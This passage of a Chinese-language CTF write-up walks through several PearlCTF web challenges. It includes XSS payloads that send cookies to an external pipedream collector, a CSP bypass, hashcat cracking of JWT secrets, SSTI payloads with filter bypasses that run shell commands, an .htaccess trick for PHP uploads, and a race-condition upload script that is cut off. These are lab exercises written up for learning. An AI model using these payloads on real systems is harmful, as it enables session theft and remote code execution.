+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 200 OK</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Give me some body"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(body[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">]))</span></span>
+<span class="line"><span style="color:#ADBAC7">	connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span></code></pre>
+<p>根据你的body来分割内容，先检查前面部分有没有问题，最后把最后一部分分割出来回显到网页上， 最后回显的部分没有任何过滤，先尝试一下直接打</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="text"><code><span class="line"><span>?body=HTTP%2F1.1%20200%20OK%0D%0A%0D%0A&#x3C;script>alert(1)&#x3C;/script></span></span></code></pre>
+<p>成功弹窗，接下来简单构造一下外带cookie就行</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="text"><code><span class="line"><span>?body=HTTP%2F1.1 200 OK%0D%0A%0D%0A&#x3C;script>document.location.href="https://eopv4zbo4fy4ld3.m.pipedream.net/?x="%2bdocument.cookie&#x3C;/script></span></span></code></pre>
+<p>拿到token</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="text"><code><span class="line"><span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzEwMjI1MDYyfQ.ucZOtlvfIFuRlGecK_0a22w5OC1lvT3himWAqgXrbS0</span></span></code></pre>
+<p>直接jwt.io改还不行，还要找到<code>SECRET</code>的key改才行</p>
+<p>用hashcat爆破</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F69D50">hashcat</span><span style="color:#6CB6FF"> -a</span><span style="color:#6CB6FF"> 3</span><span style="color:#6CB6FF"> -m</span><span style="color:#6CB6FF"> 16500</span><span style="color:#96D0FF"> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzEwMjI1MDYyfQ.ucZOtlvfIFuRlGecK_0a22w5OC1lvT3himWAqgXrbS0</span></span></code></pre>
+<p>爆破出来密钥是 … <code>banana</code></p>
+<p>最后在jwt.io上加上密钥后修改</p>
+<p>放到/flag检查得到flag</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pearl{c4nt_s3nd_th3_resP0n53_w1th0ut_Sani7iz1ng}</span></span></code></pre>
+<h2 id="i-am-a-web-noob75-solves50-points"><strong>I am a web-noob</strong>(75 Solves/50 Points)</h2>
+<p><a href="https://noob-login.ctf.pearlctf.in/">https://noob-login.ctf.pearlctf.in/</a></p>
+<p>给的是一个公共靶机没有给源码，给了一个输入用户名的地方,随便数一个用户名(123)，在主页回显</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="text"><code><span class="line"><span>Basic 123</span></span>
+<span class="line"><span>Blah blah blah</span></span></code></pre>
+<p>猜测是ssti传一个参</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?user={{7*7}}</span></span></code></pre>
+<p>回显</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>{% set config=None%}{% set self=None%} 7*7}}</span></span></code></pre>
+<p>发现连续的两个大括号被过滤掉了，随便找个不用两个大括号的payload一把梭看看</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?user={%print("".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('whoami').read())%}</span></span></code></pre>
+<p>可以看到有回显</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>{% set config=None%}{% set self=None%}{%print("".__ __.__bases__[0]. __sub es__()[138].__init__.__globals__['popen']('whoami').read())%}</span></span></code></pre>
+<p>挺多东西被过滤了，那我们用另一种思路，用<code>request.values.a</code>，在原本里面加个找个然后在传一个a里面是被过滤的内容就可以绕过了，尝试一下</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?user={%print%20(lipsum|attr(request.values.a))%}&#x26;a=__globals__</span></span></code></pre>
+<p>成功回显</p>
+<p>在回显里找到有os模块，用get获取，接下来就是如果有过滤就用<code>request.values.a</code>绕，或者用引号绕，最终payload就是</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?user={%print%20(lipsum|attr(request.values.a)).get('o''s')|attr(%22pop%22%22en%22)(%22cat /app/flag.txt%22)|attr(%22read%22)()%}%}</span></span>
+<span class="line"><span>&#x26;a=__globals__</span></span></code></pre>
+<p>得到flag</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pearl{W4s_my_p4ge_s3cur3_en0ugh_f0r_y0u?}</span></span></code></pre>
+<h2 id="rabbithole58-solves94-points"><strong>rabbithole</strong>(58 Solves/94 points)</h2>
+<p><a href="https://rabbithole.ctf.pearlctf.in/">https://rabbithole.ctf.pearlctf.in</a></p>
+<p>给了一个网页，里面什么也没有，dirmap扫一下，扫出来robots.txt访问一下</p>
+<p>里面有个<code>/w0rk_h4rd</code>要我们去访问，里面说</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>You sure are hardworking</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>but are you privileged enough?</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Here is what you want: s3cr3t1v3_m3th0d</span></span></code></pre>
+<p>第二个问我们有没有权限，我们可以看到我们的Cookie是guest，把他改成admin就行了，下面看到文字有m3th0d，method就是访问方法，还有一个加粗的hardworking，先不知道是什么，先用方法和权限访问一下回显405，方法不对，那应该不是这个页面，试试<code>/hardworking</code>，访问后成功回显flag，这题也算是纯纯靠猜的脑洞题了</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pearl{c0ngr4t5_but_th1s_1s_just_th3_b3g1nn1ng}</span></span></code></pre>
+<h2 id="learn-http-better15-solves476-points"><strong>learn HTTP better</strong>(15 Solves/476 Points)</h2>
+<p><a href="https://v1-learn-http.ctf.pearlctf.in/">https://v1-learn-http.ctf.pearlctf.in/</a></p>
+<p>是前面那题的升级版，和前面那题一样是xss，给了源码，js文件没什么改变，主要看go的源码</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="go"><code><span class="line"><span style="color:#F47067">package</span><span style="color:#F69D50"> main</span></span>
+<span class="line"><span style="color:#F47067">import</span><span style="color:#ADBAC7"> (</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">fmt</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">net</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">os</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">strings</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#96D0FF">	"</span><span style="color:#F69D50">net/url</span><span style="color:#96D0FF">"</span></span>
+<span class="line"><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">const</span><span style="color:#ADBAC7"> (</span></span>
+<span class="line"><span style="color:#6CB6FF">	SERVER_HOST</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "localhost"</span></span>
+<span class="line"><span style="color:#6CB6FF">	SERVER_PORT</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "5001"</span></span>
+<span class="line"><span style="color:#6CB6FF">	SERVER_TYPE</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "tcp"</span></span>
+<span class="line"><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#F47067">func</span><span style="color:#DCBDFB"> main</span><span style="color:#ADBAC7">() {</span></span>
+<span class="line"><span style="color:#ADBAC7">	fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Server Running..."</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">	server, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> net.</span><span style="color:#DCBDFB">Listen</span><span style="color:#ADBAC7">(SERVER_TYPE, SERVER_HOST</span><span style="color:#F47067">+</span><span style="color:#96D0FF">":"</span><span style="color:#F47067">+</span><span style="color:#ADBAC7">SERVER_PORT)</span></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error listening:"</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">		os.</span><span style="color:#DCBDFB">Exit</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#F47067">	defer</span><span style="color:#ADBAC7"> server.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Listening on "</span><span style="color:#F47067"> +</span><span style="color:#ADBAC7"> SERVER_HOST </span><span style="color:#F47067">+</span><span style="color:#96D0FF"> ":"</span><span style="color:#F47067"> +</span><span style="color:#ADBAC7"> SERVER_PORT)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	for</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> server.</span><span style="color:#DCBDFB">Accept</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">			fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error accepting: "</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">		}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">		go</span><span style="color:#DCBDFB"> processClient</span><span style="color:#ADBAC7">(connection)</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span>
+<span class="line"><span style="color:#F47067">func</span><span style="color:#DCBDFB"> processClient</span><span style="color:#ADBAC7">(</span><span style="color:#F69D50">connection</span><span style="color:#F69D50"> net</span><span style="color:#ADBAC7">.</span><span style="color:#F69D50">Conn</span><span style="color:#ADBAC7">) {</span></span>
+<span class="line"><span style="color:#ADBAC7">	buffer </span><span style="color:#F47067">:=</span><span style="color:#DCBDFB"> make</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">, </span><span style="color:#6CB6FF">1024</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">	mLen, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Read</span><span style="color:#ADBAC7">(buffer)</span></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error reading:"</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#ADBAC7">	raw_http_req </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Split</span><span style="color:#ADBAC7">(</span><span style="color:#F47067">string</span><span style="color:#ADBAC7">(buffer[:mLen]), </span><span style="color:#96D0FF">"</span><span style="color:#F47067">\r\n</span><span style="color:#96D0FF">"</span><span style="color:#ADBAC7">)[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">]</span></span>
+<span class="line"><span style="color:#ADBAC7">	splitted_req </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Split</span><span style="color:#ADBAC7">(raw_http_req, </span><span style="color:#96D0FF">" "</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> splitted_req[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">] </span><span style="color:#F47067">!=</span><span style="color:#96D0FF"> "GET"</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 405 Method Not Allowed</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Can only GET"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	parsed, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> url.</span><span style="color:#DCBDFB">Parse</span><span style="color:#ADBAC7">(splitted_req[</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">])</span></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		fmt.</span><span style="color:#DCBDFB">Println</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"Error parsing: "</span><span style="color:#ADBAC7">, err.</span><span style="color:#DCBDFB">Error</span><span style="color:#ADBAC7">())</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	path </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> parsed.Path</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> path </span><span style="color:#F47067">!=</span><span style="color:#96D0FF"> "/resp"</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 404 Not Found</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Not Found"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"><span style="color:#ADBAC7">	</span></span>
+<span class="line"><span style="color:#ADBAC7">	args, err </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> url.</span><span style="color:#DCBDFB">ParseQuery</span><span style="color:#ADBAC7">(parsed.RawQuery)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#ADBAC7"> err </span><span style="color:#F47067">!=</span><span style="color:#6CB6FF"> nil</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 500 Internal Server Error</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Error"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	body, ok </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> args[</span><span style="color:#96D0FF">"body"</span><span style="color:#ADBAC7">]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">	if</span><span style="color:#F47067"> !</span><span style="color:#ADBAC7">ok {</span></span>
+<span class="line"><span style="color:#ADBAC7">		_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(</span><span style="color:#96D0FF">"HTTP/1.1 200 OK</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">Give me some body"</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#ADBAC7">		connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#F47067">		return</span></span>
+<span class="line"><span style="color:#ADBAC7">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	splitted_resp </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Split</span><span style="color:#ADBAC7">(body[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">], </span><span style="color:#96D0FF">"</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">	new_header </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Join</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">string</span><span style="color:#ADBAC7">{splitted_resp[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">], </span><span style="color:#96D0FF">"Content-Security-Policy: script-src 'self'"</span><span style="color:#ADBAC7">}, </span><span style="color:#96D0FF">"</span><span style="color:#F47067">\r\n</span><span style="color:#96D0FF">"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	final_body </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Join</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">string</span><span style="color:#ADBAC7">{new_header, splitted_resp[</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">]}, </span><span style="color:#96D0FF">"</span><span style="color:#F47067">\r\n\r\n</span><span style="color:#96D0FF">"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">	_, err </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> connection.</span><span style="color:#DCBDFB">Write</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">byte</span><span style="color:#ADBAC7">(final_body))</span></span>
+<span class="line"><span style="color:#ADBAC7">	connection.</span><span style="color:#DCBDFB">Close</span><span style="color:#ADBAC7">()</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span></code></pre>
+<p>多了一个</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="go"><code><span class="line"><span style="color:#ADBAC7">new_header </span><span style="color:#F47067">:=</span><span style="color:#ADBAC7"> strings.</span><span style="color:#DCBDFB">Join</span><span style="color:#ADBAC7">([]</span><span style="color:#F47067">string</span><span style="color:#ADBAC7">{splitted_resp[</span><span style="color:#6CB6FF">0</span><span style="color:#ADBAC7">], </span><span style="color:#96D0FF">"Content-Security-Policy: script-src 'self'"</span><span style="color:#ADBAC7">}, </span><span style="color:#96D0FF">"</span><span style="color:#F47067">\r\n</span><span style="color:#96D0FF">"</span><span style="color:#ADBAC7">)</span></span></code></pre>
+<blockquote>
+<p><code>script-src</code> 是一个指令，用于控制特定页面的一组与脚本相关的权限，定义此策略后，当浏览器从任何其他来源加载脚本时，只会抛出错误消息。即使恶意攻击者成功的代码注入到 Web 站点时，也只能遇到错误消息</p>
+</blockquote>
+<p>既然是self我们只需要把他定向到自己就可以了</p>
+<p>那么我们构造出来脚本就为</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#ADBAC7">&#x3C;</span><span style="color:#8DDB8C">script</span><span style="color:#6CB6FF"> src</span><span style="color:#ADBAC7">=</span><span style="color:#96D0FF">"/resp?body=HTTP%252F1.1%2520200%2520OK%250D%250A%250D%250Aalert(1)"</span><span style="color:#ADBAC7">>&#x3C;/</span><span style="color:#8DDB8C">script</span><span style="color:#ADBAC7">></span></span></code></pre>
+<p>成功弹窗，最后构造payload</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#ADBAC7">HTTP%2F1.1 200 OK%0D%0A%0D%0A&#x3C;script src="/resp?body=HTTP%252F1.1%2520200%2520OK%250D%250A%250D%250Adocument.location.href=%27https://eopv4zbo4fy4ld3.m.pipedream.net/?%27%252Bdocument.cookie">&#x3C;/script></span></span></code></pre>
+<p>反弹回cookie</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzEwMjMxMTI1fQ._ej8la2uH7bscSM0WGhbtAt906crQ1OORF4zUtp9moo</span></span></code></pre>
+<p>继续用hashcat看一下密钥是password</p>
+<p>得到flag</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pearl{w0w_7hat_w4s_0ut_Of_th3_boX}</span></span></code></pre>
+<h2 id="uploader5-solves499-points"><strong>Uploader</strong>(5 Solves/499 Points)</h2>
+<p>进去之后是一个upload界面，里面似乎只过滤文件内容，对文件名并不过滤，但是会对文件名进行hash</p>
+<p>这个的后端过滤很奇怪，<code>&#x3C;>[]()=</code>等字符似乎可以存在，但是，只要左右超过有两个字符就会被过滤，同时php也被过滤了，中间思考过程就不说了，说了就太长了，和一个师傅讨论了快两个小时才出，直接给出正确的思考答案</p>
+<p>首先先上传<code>.htaccess</code></p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ph\</span></span>
+<span class="line"><span>p_flag engine 1</span></span>
+<span class="line"><span>ph\</span></span>
+<span class="line"><span>p_value auto_prepend_file .ph\</span></span>
+<span class="line"><span>p</span></span></code></pre>
+<p>是的！我们整了半天，发现是php的解析没开，当时也完全没有想到，而斜杠则是绕过php的过滤</p>
+<p>而php则是简单的条件竞争就能传上去并解析，虽然还是会删除，但是传一个写木马上去解析就行，最后找到flag在<code>/opt/flag.txt</code>(也算是逆天这么能藏，加了.txt find也find不到，附上别的师傅的吐槽)</p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="192" height="555" src="/_astro/tucao._8k8IuEX_ZcK7Sl.webp" ></p>
+<p>最后附上竞争代码</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F47067">import</span><span style="color:#ADBAC7"> requests</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">import</span><span style="color:#ADBAC7"> threading</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> getphpinfo</span><span style="color:#ADBAC7">():</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">    url </span><span style="color:#F47067">=</span><span style="color:#96D0FF"> "https://uploader-be0b0177dfa5950d.ctf.pearlctf.in"</span></span>
+<span class="line"><span style="color:#ADBAC7">    headers </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#96D0FF">    "Host"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"uploader-be0b0177dfa5950d.ctf.pearlctf.in"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "User-Agent"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Accept"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Accept-Language"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Accept-Encoding"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"gzip, deflate"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Content-Type"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"multipart/form-data; boundary=---------------------------72940437516480145501393954295"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Origin"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"https://uploader-be0b0177dfa5950d.ctf.pearlctf.in"</span><span style="color:#ADBAC7">,</span></span>
